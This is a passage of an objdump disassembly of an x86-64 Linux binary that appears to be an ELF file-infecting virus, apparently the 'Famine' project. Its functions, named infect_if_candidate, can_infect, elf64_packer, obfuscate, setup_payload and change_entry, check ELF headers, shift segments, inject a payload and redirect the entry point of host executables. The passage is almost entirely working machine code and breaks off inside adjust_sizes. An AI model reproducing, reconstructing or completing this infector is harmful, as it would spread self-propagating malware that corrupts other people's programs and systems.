    2c0b:	48 8d 7d d0          	lea    -0x30(%rbp),%rdi
    2c0f:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2c13:	89 45 88             	mov    %eax,-0x78(%rbp)
    2c16:	e8 f5 f0 ff ff       	callq  1d10 <original_accessor>
    2c1b:	a8 01                	test   $0x1,%al
    2c1d:	0f 85 09 00 00 00    	jne    2c2c <infect_if_candidate+0xac>
    2c23:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2c27:	e9 9e 00 00 00       	jmpq   2cca <infect_if_candidate+0x14a>
    2c2c:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    2c30:	48 05 10 00 00 00    	add    $0x10,%rax
    2c36:	48 8b 75 d8          	mov    -0x28(%rbp),%rsi
    2c3a:	48 89 c7             	mov    %rax,%rdi
    2c3d:	e8 0e f2 ff ff       	callq  1e50 <clone_accessor>
    2c42:	a8 01                	test   $0x1,%al
    2c44:	0f 85 09 00 00 00    	jne    2c53 <infect_if_candidate+0xd3>
    2c4a:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2c4e:	e9 77 00 00 00       	jmpq   2cca <infect_if_candidate+0x14a>
    2c53:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
    2c57:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
    2c5b:	48 8b 08             	mov    (%rax),%rcx
    2c5e:	48 89 0c 24          	mov    %rcx,(%rsp)
    2c62:	48 8b 48 08          	mov    0x8(%rax),%rcx
    2c66:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    2c6b:	48 8b 48 10          	mov    0x10(%rax),%rcx
    2c6f:	48 89 4c 24 10       	mov    %rcx,0x10(%rsp)
    2c74:	48 8b 40 18          	mov    0x18(%rax),%rax
    2c78:	48 89 44 24 18       	mov    %rax,0x18(%rsp)
    2c7d:	e8 0e 04 00 00       	callq  3090 <elf64_packer>
    2c82:	a8 01                	test   $0x1,%al
    2c84:	0f 85 09 00 00 00    	jne    2c93 <infect_if_candidate+0x113>
    2c8a:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2c8e:	e9 37 00 00 00       	jmpq   2cca <infect_if_candidate+0x14a>
    2c93:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2c97:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    2c9b:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    2c9f:	e8 3c f2 ff ff       	callq  1ee0 <write_clone_file>
    2ca4:	48 8d 7d d0          	lea    -0x30(%rbp),%rdi
    2ca8:	88 45 87             	mov    %al,-0x79(%rbp)
    2cab:	e8 00 f0 ff ff       	callq  1cb0 <free_accessor>
    2cb0:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
    2cb4:	48 81 c1 10 00 00 00 	add    $0x10,%rcx
    2cbb:	48 89 cf             	mov    %rcx,%rdi
    2cbe:	88 45 86             	mov    %al,-0x7a(%rbp)
    2cc1:	e8 ea ef ff ff       	callq  1cb0 <free_accessor>
    2cc6:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2cca:	8a 45 ff             	mov    -0x1(%rbp),%al
    2ccd:	24 01                	and    $0x1,%al
    2ccf:	0f b6 c0             	movzbl %al,%eax
    2cd2:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
    2cd9:	5d                   	pop    %rbp
    2cda:	c3                   	retq   
    2cdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000002ce0 <elf64_identifier>:
    2ce0:	55                   	push   %rbp
    2ce1:	48 89 e5             	mov    %rsp,%rbp
    2ce4:	48 83 ec 20          	sub    $0x20,%rsp
    2ce8:	48 8d 75 ec          	lea    -0x14(%rbp),%rsi
    2cec:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    2cf0:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    2cf4:	c6 45 ec 7f          	movb   $0x7f,-0x14(%rbp)
    2cf8:	c6 45 ed 45          	movb   $0x45,-0x13(%rbp)
    2cfc:	c6 45 ee 4c          	movb   $0x4c,-0x12(%rbp)
    2d00:	c6 45 ef 46          	movb   $0x46,-0x11(%rbp)
    2d04:	ba 04 00 00 00       	mov    $0x4,%edx
    2d09:	e8 62 e5 ff ff       	callq  1270 <ft_memcmp>
    2d0e:	83 f8 00             	cmp    $0x0,%eax
    2d11:	0f 85 4f 00 00 00    	jne    2d66 <elf64_identifier+0x86>
    2d17:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d1b:	0f b6 48 04          	movzbl 0x4(%rax),%ecx
    2d1f:	83 f9 02             	cmp    $0x2,%ecx
    2d22:	0f 85 3e 00 00 00    	jne    2d66 <elf64_identifier+0x86>
    2d28:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d2c:	0f b6 48 05          	movzbl 0x5(%rax),%ecx
    2d30:	83 f9 01             	cmp    $0x1,%ecx
    2d33:	0f 85 2d 00 00 00    	jne    2d66 <elf64_identifier+0x86>
    2d39:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d3d:	48 83 78 18 00       	cmpq   $0x0,0x18(%rax)
    2d42:	0f 84 1e 00 00 00    	je     2d66 <elf64_identifier+0x86>
    2d48:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d4c:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
    2d51:	0f 84 0f 00 00 00    	je     2d66 <elf64_identifier+0x86>
    2d57:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d5b:	48 83 78 28 00       	cmpq   $0x0,0x28(%rax)
    2d60:	0f 85 09 00 00 00    	jne    2d6f <elf64_identifier+0x8f>
    2d66:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2d6a:	e9 04 00 00 00       	jmpq   2d73 <elf64_identifier+0x93>
    2d6f:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2d73:	8a 45 ff             	mov    -0x1(%rbp),%al
    2d76:	24 01                	and    $0x1,%al
    2d78:	0f b6 c0             	movzbl %al,%eax
    2d7b:	48 83 c4 20          	add    $0x20,%rsp
    2d7f:	5d                   	pop    %rbp
    2d80:	c3                   	retq   
    2d81:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    2d88:	00 00 00 
    2d8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000002d90 <foreach_phdr>:
    2d90:	55                   	push   %rbp
    2d91:	48 89 e5             	mov    %rsp,%rbp
    2d94:	48 83 ec 70          	sub    $0x70,%rsp
    2d98:	31 c0                	xor    %eax,%eax
    2d9a:	41 89 c0             	mov    %eax,%r8d
    2d9d:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2da1:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2da5:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    2da9:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    2dad:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2db1:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    2db5:	4c 89 c7             	mov    %r8,%rdi
    2db8:	be 40 00 00 00       	mov    $0x40,%esi
    2dbd:	e8 8e ee ff ff       	callq  1c50 <safe_accessor>
    2dc2:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2dc6:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
    2dcb:	0f 85 09 00 00 00    	jne    2dda <foreach_phdr+0x4a>
    2dd1:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2dd5:	e9 22 01 00 00       	jmpq   2efc <foreach_phdr+0x16c>
    2dda:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2dde:	48 8b 40 20          	mov    0x20(%rax),%rax
    2de2:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    2de6:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2dea:	66 8b 48 36          	mov    0x36(%rax),%cx
    2dee:	66 89 4d c6          	mov    %cx,-0x3a(%rbp)
    2df2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2df6:	66 8b 48 38          	mov    0x38(%rax),%cx
    2dfa:	66 89 4d c4          	mov    %cx,-0x3c(%rbp)
    2dfe:	0f b7 55 c6          	movzwl -0x3a(%rbp),%edx
    2e02:	89 d0                	mov    %edx,%eax
    2e04:	48 c7 45 b8 00 00 00 	movq   $0x0,-0x48(%rbp)
    2e0b:	00 
    2e0c:	0f b7 55 c6          	movzwl -0x3a(%rbp),%edx
    2e10:	0f b7 75 c4          	movzwl -0x3c(%rbp),%esi
    2e14:	0f af d6             	imul   %esi,%edx
    2e17:	48 63 fa             	movslq %edx,%rdi
    2e1a:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
    2e1e:	0f b7 55 c6          	movzwl -0x3a(%rbp),%edx
    2e22:	89 d7                	mov    %edx,%edi
    2e24:	48 83 ff 38          	cmp    $0x38,%rdi
    2e28:	48 89 45 98          	mov    %rax,-0x68(%rbp)
    2e2c:	0f 82 4b 00 00 00    	jb     2e7d <foreach_phdr+0xed>
    2e32:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2e36:	0f b7 4d c6          	movzwl -0x3a(%rbp),%ecx
    2e3a:	89 ca                	mov    %ecx,%edx
    2e3c:	31 c9                	xor    %ecx,%ecx
    2e3e:	48 89 55 90          	mov    %rdx,-0x70(%rbp)
    2e42:	89 ca                	mov    %ecx,%edx
    2e44:	48 8b 75 90          	mov    -0x70(%rbp),%rsi
    2e48:	48 f7 f6             	div    %rsi
    2e4b:	0f b7 4d c4          	movzwl -0x3c(%rbp),%ecx
    2e4f:	89 cf                	mov    %ecx,%edi
    2e51:	48 39 f8             	cmp    %rdi,%rax
    2e54:	0f 85 23 00 00 00    	jne    2e7d <foreach_phdr+0xed>
    2e5a:	48 8b 7d c8          	mov    -0x38(%rbp),%rdi
    2e5e:	48 8b 75 b0          	mov    -0x50(%rbp),%rsi
    2e62:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2e66:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    2e6a:	e8 e1 ed ff ff       	callq  1c50 <safe_accessor>
    2e6f:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    2e73:	48 83 f8 00          	cmp    $0x0,%rax
    2e77:	0f 85 09 00 00 00    	jne    2e86 <foreach_phdr+0xf6>
    2e7d:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2e81:	e9 76 00 00 00       	jmpq   2efc <foreach_phdr+0x16c>
    2e86:	e9 00 00 00 00       	jmpq   2e8b <foreach_phdr+0xfb>
    2e8b:	66 8b 45 c4          	mov    -0x3c(%rbp),%ax
    2e8f:	66 89 c1             	mov    %ax,%cx
    2e92:	66 83 c1 ff          	add    $0xffff,%cx
    2e96:	66 89 4d c4          	mov    %cx,-0x3c(%rbp)
    2e9a:	66 83 f8 00          	cmp    $0x0,%ax
    2e9e:	0f 84 54 00 00 00    	je     2ef8 <foreach_phdr+0x168>
    2ea4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    2ea8:	0f b7 4d c4          	movzwl -0x3c(%rbp),%ecx
    2eac:	89 ca                	mov    %ecx,%edx
    2eae:	48 8b 75 98          	mov    -0x68(%rbp),%rsi
    2eb2:	48 0f af d6          	imul   %rsi,%rdx
    2eb6:	48 01 d0             	add    %rdx,%rax
    2eb9:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    2ebd:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    2ec1:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    2ec5:	48 29 d0             	sub    %rdx,%rax
    2ec8:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    2ecc:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2ed0:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
    2ed4:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    2ed8:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    2edc:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2ee0:	ff d0                	callq  *%rax
    2ee2:	a8 01                	test   $0x1,%al
    2ee4:	0f 85 09 00 00 00    	jne    2ef3 <foreach_phdr+0x163>
    2eea:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2eee:	e9 09 00 00 00       	jmpq   2efc <foreach_phdr+0x16c>
    2ef3:	e9 93 ff ff ff       	jmpq   2e8b <foreach_phdr+0xfb>
    2ef8:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2efc:	8a 45 ff             	mov    -0x1(%rbp),%al
    2eff:	24 01                	and    $0x1,%al
    2f01:	0f b6 c0             	movzbl %al,%eax
    2f04:	48 83 c4 70          	add    $0x70,%rsp
    2f08:	5d                   	pop    %rbp
    2f09:	c3                   	retq   
    2f0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000002f10 <foreach_shdr>:
    2f10:	55                   	push   %rbp
    2f11:	48 89 e5             	mov    %rsp,%rbp
    2f14:	48 83 ec 70          	sub    $0x70,%rsp
    2f18:	31 c0                	xor    %eax,%eax
    2f1a:	41 89 c0             	mov    %eax,%r8d
    2f1d:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2f21:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2f25:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    2f29:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    2f2d:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2f31:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    2f35:	4c 89 c7             	mov    %r8,%rdi
    2f38:	be 40 00 00 00       	mov    $0x40,%esi
    2f3d:	e8 0e ed ff ff       	callq  1c50 <safe_accessor>
    2f42:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2f46:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
    2f4b:	0f 85 09 00 00 00    	jne    2f5a <foreach_shdr+0x4a>
    2f51:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2f55:	e9 22 01 00 00       	jmpq   307c <foreach_shdr+0x16c>
    2f5a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2f5e:	48 8b 40 28          	mov    0x28(%rax),%rax
    2f62:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    2f66:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2f6a:	66 8b 48 3a          	mov    0x3a(%rax),%cx
    2f6e:	66 89 4d c6          	mov    %cx,-0x3a(%rbp)
    2f72:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2f76:	66 8b 48 3c          	mov    0x3c(%rax),%cx
    2f7a:	66 89 4d c4          	mov    %cx,-0x3c(%rbp)
    2f7e:	0f b7 55 c6          	movzwl -0x3a(%rbp),%edx
    2f82:	89 d0                	mov    %edx,%eax
    2f84:	48 c7 45 b8 00 00 00 	movq   $0x0,-0x48(%rbp)
    2f8b:	00 
    2f8c:	0f b7 55 c6          	movzwl -0x3a(%rbp),%edx
    2f90:	0f b7 75 c4          	movzwl -0x3c(%rbp),%esi
    2f94:	0f af d6             	imul   %esi,%edx
    2f97:	48 63 fa             	movslq %edx,%rdi
    2f9a:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
    2f9e:	0f b7 55 c6          	movzwl -0x3a(%rbp),%edx
    2fa2:	89 d7                	mov    %edx,%edi
    2fa4:	48 83 ff 40          	cmp    $0x40,%rdi
    2fa8:	48 89 45 98          	mov    %rax,-0x68(%rbp)
    2fac:	0f 82 4b 00 00 00    	jb     2ffd <foreach_shdr+0xed>
    2fb2:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    2fb6:	0f b7 4d c6          	movzwl -0x3a(%rbp),%ecx
    2fba:	89 ca                	mov    %ecx,%edx
    2fbc:	31 c9                	xor    %ecx,%ecx
    2fbe:	48 89 55 90          	mov    %rdx,-0x70(%rbp)
    2fc2:	89 ca                	mov    %ecx,%edx
    2fc4:	48 8b 75 90          	mov    -0x70(%rbp),%rsi
    2fc8:	48 f7 f6             	div    %rsi
    2fcb:	0f b7 4d c4          	movzwl -0x3c(%rbp),%ecx
    2fcf:	89 cf                	mov    %ecx,%edi
    2fd1:	48 39 f8             	cmp    %rdi,%rax
    2fd4:	0f 85 23 00 00 00    	jne    2ffd <foreach_shdr+0xed>
    2fda:	48 8b 7d c8          	mov    -0x38(%rbp),%rdi
    2fde:	48 8b 75 b0          	mov    -0x50(%rbp),%rsi
    2fe2:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2fe6:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    2fea:	e8 61 ec ff ff       	callq  1c50 <safe_accessor>
    2fef:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    2ff3:	48 83 f8 00          	cmp    $0x0,%rax
    2ff7:	0f 85 09 00 00 00    	jne    3006 <foreach_shdr+0xf6>
    2ffd:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    3001:	e9 76 00 00 00       	jmpq   307c <foreach_shdr+0x16c>
    3006:	e9 00 00 00 00       	jmpq   300b <foreach_shdr+0xfb>
    300b:	66 8b 45 c4          	mov    -0x3c(%rbp),%ax
    300f:	66 89 c1             	mov    %ax,%cx
    3012:	66 83 c1 ff          	add    $0xffff,%cx
    3016:	66 89 4d c4          	mov    %cx,-0x3c(%rbp)
    301a:	66 83 f8 00          	cmp    $0x0,%ax
    301e:	0f 84 54 00 00 00    	je     3078 <foreach_shdr+0x168>
    3024:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    3028:	0f b7 4d c4          	movzwl -0x3c(%rbp),%ecx
    302c:	89 ca                	mov    %ecx,%edx
    302e:	48 8b 75 98          	mov    -0x68(%rbp),%rsi
    3032:	48 0f af d6          	imul   %rsi,%rdx
    3036:	48 01 d0             	add    %rdx,%rax
    3039:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
    303d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
    3041:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    3045:	48 29 d0             	sub    %rdx,%rax
    3048:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    304c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3050:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
    3054:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    3058:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    305c:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    3060:	ff d0                	callq  *%rax
    3062:	a8 01                	test   $0x1,%al
    3064:	0f 85 09 00 00 00    	jne    3073 <foreach_shdr+0x163>
    306a:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    306e:	e9 09 00 00 00       	jmpq   307c <foreach_shdr+0x16c>
    3073:	e9 93 ff ff ff       	jmpq   300b <foreach_shdr+0xfb>
    3078:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    307c:	8a 45 ff             	mov    -0x1(%rbp),%al
    307f:	24 01                	and    $0x1,%al
    3081:	0f b6 c0             	movzbl %al,%eax
    3084:	48 83 c4 70          	add    $0x70,%rsp
    3088:	5d                   	pop    %rbp
    3089:	c3                   	retq   
    308a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000003090 <elf64_packer>:
    3090:	55                   	push   %rbp
    3091:	48 89 e5             	mov    %rsp,%rbp
    3094:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
    309b:	48 8d 45 10          	lea    0x10(%rbp),%rax
    309f:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    30a3:	48 8b 30             	mov    (%rax),%rsi
    30a6:	48 8b 50 08          	mov    0x8(%rax),%rdx
    30aa:	48 8d 7d c8          	lea    -0x38(%rbp),%rdi
    30ae:	48 89 45 90          	mov    %rax,-0x70(%rbp)
    30b2:	e8 79 f6 ff ff       	callq  2730 <find_entry>
    30b7:	a8 01                	test   $0x1,%al
    30b9:	0f 85 05 00 00 00    	jne    30c4 <elf64_packer+0x34>
    30bf:	e9 3a 01 00 00       	jmpq   31fe <elf64_packer+0x16e>
    30c4:	48 8d 7d c8          	lea    -0x38(%rbp),%rdi
    30c8:	48 8b 75 90          	mov    -0x70(%rbp),%rsi
    30cc:	e8 0f 06 00 00       	callq  36e0 <obfuscate>
    30d1:	a8 01                	test   $0x1,%al
    30d3:	0f 85 05 00 00 00    	jne    30de <elf64_packer+0x4e>
    30d9:	e9 20 01 00 00       	jmpq   31fe <elf64_packer+0x16e>
    30de:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    30e2:	48 8b 30             	mov    (%rax),%rsi
    30e5:	48 8b 50 08          	mov    0x8(%rax),%rdx
    30e9:	48 8d 7d c8          	lea    -0x38(%rbp),%rdi
    30ed:	e8 8e f9 ff ff       	callq  2a80 <can_infect>
    30f2:	a8 01                	test   $0x1,%al
    30f4:	0f 85 05 00 00 00    	jne    30ff <elf64_packer+0x6f>
    30fa:	e9 ff 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    30ff:	48 8d 7d c8          	lea    -0x38(%rbp),%rdi
    3103:	48 8d 75 98          	lea    -0x68(%rbp),%rsi
    3107:	e8 14 01 00 00       	callq  3220 <define_shift_amount>
    310c:	a8 01                	test   $0x1,%al
    310e:	0f 85 05 00 00 00    	jne    3119 <elf64_packer+0x89>
    3114:	e9 e5 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    3119:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    311d:	48 8b 75 98          	mov    -0x68(%rbp),%rsi
    3121:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    3125:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    3129:	48 8b 08             	mov    (%rax),%rcx
    312c:	48 89 0c 24          	mov    %rcx,(%rsp)
    3130:	48 8b 48 08          	mov    0x8(%rax),%rcx
    3134:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    3139:	48 8b 48 10          	mov    0x10(%rax),%rcx
    313d:	48 89 4c 24 10       	mov    %rcx,0x10(%rsp)
    3142:	48 8b 48 18          	mov    0x18(%rax),%rcx
    3146:	48 89 4c 24 18       	mov    %rcx,0x18(%rsp)
    314b:	e8 00 f1 ff ff       	callq  2250 <copy_to_clone>
    3150:	a8 01                	test   $0x1,%al
    3152:	0f 85 05 00 00 00    	jne    315d <elf64_packer+0xcd>
    3158:	e9 a1 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    315d:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
    3161:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    3165:	48 8b 78 10          	mov    0x10(%rax),%rdi
    3169:	48 8b 70 18          	mov    0x18(%rax),%rsi
    316d:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
    3171:	e8 fa ed ff ff       	callq  1f70 <adjust_references>
    3176:	a8 01                	test   $0x1,%al
    3178:	0f 85 05 00 00 00    	jne    3183 <elf64_packer+0xf3>
    317e:	e9 7b 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    3183:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    3187:	48 8b 70 10          	mov    0x10(%rax),%rsi
    318b:	48 8b 50 18          	mov    0x18(%rax),%rdx
    318f:	48 8d 7d a0          	lea    -0x60(%rbp),%rdi
    3193:	e8 98 f5 ff ff       	callq  2730 <find_entry>
    3198:	a8 01                	test   $0x1,%al
    319a:	0f 85 05 00 00 00    	jne    31a5 <elf64_packer+0x115>
    31a0:	e9 59 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    31a5:	48 8b 7d 98          	mov    -0x68(%rbp),%rdi
    31a9:	48 8d 75 a0          	lea    -0x60(%rbp),%rsi
    31ad:	e8 5e 01 00 00       	callq  3310 <adjust_sizes>
    31b2:	a8 01                	test   $0x1,%al
    31b4:	0f 85 05 00 00 00    	jne    31bf <elf64_packer+0x12f>
    31ba:	e9 3f 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    31bf:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    31c3:	48 8b 70 10          	mov    0x10(%rax),%rsi
    31c7:	48 8b 50 18          	mov    0x18(%rax),%rdx
    31cb:	48 8d 7d a0          	lea    -0x60(%rbp),%rdi
    31cf:	e8 bc 02 00 00       	callq  3490 <setup_payload>
    31d4:	a8 01                	test   $0x1,%al
    31d6:	0f 85 05 00 00 00    	jne    31e1 <elf64_packer+0x151>
    31dc:	e9 1d 00 00 00       	jmpq   31fe <elf64_packer+0x16e>
    31e1:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    31e5:	48 8b 78 10          	mov    0x10(%rax),%rdi
    31e9:	48 8b 70 18          	mov    0x18(%rax),%rsi
    31ed:	48 8d 55 c8          	lea    -0x38(%rbp),%rdx
    31f1:	e8 ca 01 00 00       	callq  33c0 <change_entry>
    31f6:	a8 01                	test   $0x1,%al
    31f8:	0f 85 09 00 00 00    	jne    3207 <elf64_packer+0x177>
    31fe:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    3202:	e9 04 00 00 00       	jmpq   320b <elf64_packer+0x17b>
    3207:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    320b:	8a 45 ff             	mov    -0x1(%rbp),%al
    320e:	24 01                	and    $0x1,%al
    3210:	0f b6 c0             	movzbl %al,%eax
    3213:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
    321a:	5d                   	pop    %rbp
    321b:	c3                   	retq   
    321c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000003220 <define_shift_amount>:
    3220:	55                   	push   %rbp
    3221:	48 89 e5             	mov    %rsp,%rbp
    3224:	48 8d 05 75 05 00 00 	lea    0x575(%rip),%rax        # 37a0 <_start>
    322b:	48 8d 0d ce dd ff ff 	lea    -0x2232(%rip),%rcx        # 1000 <famine_entry>
    3232:	48 29 c8             	sub    %rcx,%rax
    3235:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    3239:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    323d:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    3241:	48 8b 09             	mov    (%rcx),%rcx
    3244:	48 8b 49 20          	mov    0x20(%rcx),%rcx
    3248:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    324c:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    3250:	48 8b 09             	mov    (%rcx),%rcx
    3253:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    3257:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    325b:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    325f:	48 03 4d e0          	add    -0x20(%rbp),%rcx
    3263:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    3267:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    326b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    326f:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    3273:	48 2b 41 18          	sub    0x18(%rcx),%rax
    3277:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    327b:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    327f:	48 3b 45 c0          	cmp    -0x40(%rbp),%rax
    3283:	0f 83 14 00 00 00    	jae    329d <define_shift_amount+0x7d>
    3289:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    328d:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    3294:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    3298:	e9 65 00 00 00       	jmpq   3302 <define_shift_amount+0xe2>
    329d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    32a1:	48 8b 00             	mov    (%rax),%rax
    32a4:	48 8b 40 28          	mov    0x28(%rax),%rax
    32a8:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    32ac:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    32b0:	48 8b 00             	mov    (%rax),%rax
    32b3:	48 8b 40 30          	mov    0x30(%rax),%rax
    32b7:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    32bb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    32bf:	48 05 00 10 00 00    	add    $0x1000,%rax
    32c5:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
    32cb:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    32cf:	48 89 01             	mov    %rax,(%rcx)
    32d2:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    32d6:	31 d2                	xor    %edx,%edx
    32d8:	48 f7 75 b0          	divq   -0x50(%rbp)
    32dc:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    32e0:	48 03 11             	add    (%rcx),%rdx
    32e3:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    32e7:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
    32eb:	48 3b 4d b0          	cmp    -0x50(%rbp),%rcx
    32ef:	0f 86 09 00 00 00    	jbe    32fe <define_shift_amount+0xde>
    32f5:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    32f9:	e9 04 00 00 00       	jmpq   3302 <define_shift_amount+0xe2>
    32fe:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    3302:	8a 45 ff             	mov    -0x1(%rbp),%al
    3305:	24 01                	and    $0x1,%al
    3307:	0f b6 c0             	movzbl %al,%eax
    330a:	5d                   	pop    %rbp
    330b:	c3                   	retq   
    330c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000003310 <adjust_sizes>:
    3310:	55                   	push   %rbp
    3311:	48 89 e5             	mov    %rsp,%rbp
    3314:	48 8d 05 85 04 00 00 	lea    0x485(%rip),%rax        # 37a0 <_start>
